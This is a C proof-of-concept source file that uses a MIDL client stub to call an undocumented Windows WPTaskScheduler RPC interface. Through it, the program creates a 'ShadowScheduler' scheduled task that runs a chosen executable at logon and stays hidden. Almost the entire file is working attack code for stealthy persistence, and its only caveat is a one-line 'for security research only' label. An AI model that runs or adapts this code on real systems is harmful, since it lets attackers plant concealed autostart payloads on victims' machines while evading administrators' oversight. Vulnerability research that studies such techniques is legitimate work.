/*
 * PoC v6: WP TaskScheduler Hidden Task (MIDL stub from RpcView IDL)
 *
 * Compile:
 *   midl /protocol all /client stub /server none /env x64 /app_config WPTaskScheduler.idl
 *   cl /W3 /nologo poc_midl.c WPTaskScheduler_c.c /link rpcrt4.lib ole32.lib
 *
 * FOR SECURITY RESEARCH ONLY
 */
#include <windows.h>
#include <stdio.h>
#include <objbase.h>
#include "WPTaskScheduler.h"

#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "ole32.lib")

void* __RPC_USER MIDL_user_allocate(SIZE_T size) { return malloc(size); }
void  __RPC_USER MIDL_user_free(void* p) { free(p); }

int wmain(int argc, wchar_t** argv)
{
    RPC_WSTR strBind = NULL;
    RPC_STATUS st;
    wchar_t guidStr[256], taskName[512];
    long rc;

    /* Structures */
    Struct_22_t guid_s = {0};
    Struct_498_t params = {0};
    Struct_314_t trigger = {0};
    Struct_154_t trigLogon = {0};
    Struct_132_t trigItem = {0};
    Struct_482_t action = {0};
    Struct_380_t actionExec = {0};

    printf("== WP TaskScheduler PoC v6 (RpcView IDL + MIDL) ==\n\n");
    if (argc < 2) {
        printf("Usage: %ls <exe_path> [args]\n", argv[0]);
        return 1;
    }
    printf("[*] Path: %ls\n", argv[1]);

    /* Step 1: RPC Binding (bare ncalrpc) */
    st = RpcStringBindingComposeW(NULL, (RPC_WSTR)L"ncalrpc",
                                  NULL, NULL, NULL, &strBind);
    if (st) { printf("[-] Compose: 0x%lX\n", st); return 1; }
    st = RpcBindingFromStringBindingW(strBind, &hWPTS);
    RpcStringFreeW(&strBind);
    if (st) { printf("[-] Bind: 0x%lX\n", st); return 1; }
    printf("[*] RPC binding created\n");/* Step 2: Generate GUID */
    CoCreateGuid((GUID*)&guid_s);
    StringFromGUID2((GUID*)&guid_s, guidStr, 256);
    wcscpy_s(taskName, 512, L"ShadowScheduler_");
    wcscat_s(taskName, 512, guidStr);
    printf("[*] Task: %ls\n", taskName);

    /* Step 3: Build trigger (logon trigger)
     * Struct_314_t.StructMember0 = 0 (case 0 -> Struct_154_t)
     * Struct_154_t -> Struct_132_t (trigger item with magic values)
     * Magic values 0xA3BC1875, 0x0D83063E go into Struct_110_t.StructMember0[2] */
    trigItem.StructMember0.StructMember0[0] = (long)0xA3BC1875;
    trigItem.StructMember0.StructMember0[1] = (long)0x0D83063E;
    trigItem.StructMember1 = 0;
    trigItem.StructMember2 = 0;
    trigItem.StructMember3 = NULL;
    trigItem.StructMember4 = 0;
    trigItem.StructMember5 = 0;

    trigLogon.StructMember0 = 0;
    trigLogon.StructMember1 = 0;
    trigLogon.StructMember2 = 0;
    trigLogon.StructMember3 = &trigItem;

    trigger.StructMember0 = 1;  /* case 1 = direct trigger item (Struct_132_t) */
    trigger.StructMember1.unionMember_1 = &trigItem;

    /* Step 4: Build action (exec action)
     * Struct_482_t.StructMember0 = 0 (case 0 -> Struct_380_t) */
    actionExec.StructMember0 = argv[1];
    actionExec.StructMember1 = (argc > 2) ? argv[2] : L"";

    action.StructMember0 = 0;  /* case 0 = exec */
    action.StructMember1.unionMember_0 = &actionExec;

    /* Step 5: Build Struct_498_t (main params) */
    params.StructMember0 = &guid_s;         /* [ref] GUID */
    params.StructMember1 = 1;               /* flags = 1 */
    params.StructMember2 = taskName;        /* task name */
    /* StructMember3, StructMember4 = Struct_2_t (time, all zeros) */
    params.StructMember5 = -1;              /* 0xFFFFFFFF */
    params.StructMember6 = &trigger;        /* trigger */
    params.StructMember7 = &action;         /* action */
    params.StructMember8 = 0;
    params.StructMember9 = 0;

    /* Step 6: Call Proc0 */
    printf("[*] Calling Proc0 (WptsCreateSchedule)...\n");
    __try {
        rc = Proc0(&params, 1);
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        printf("[!] Exception: 0x%08X\n", GetExceptionCode());
        rc = -1;
    }

    RpcBindingFree(&hWPTS);
    printf("[*] Result: 0x%08lX\n", rc);
    if (rc == 0)
        printf("[+] SUCCESS - hidden task created\n");
    else
        printf("[-] Failed (0x%08lX)\n", rc);
    return (int)rc;
}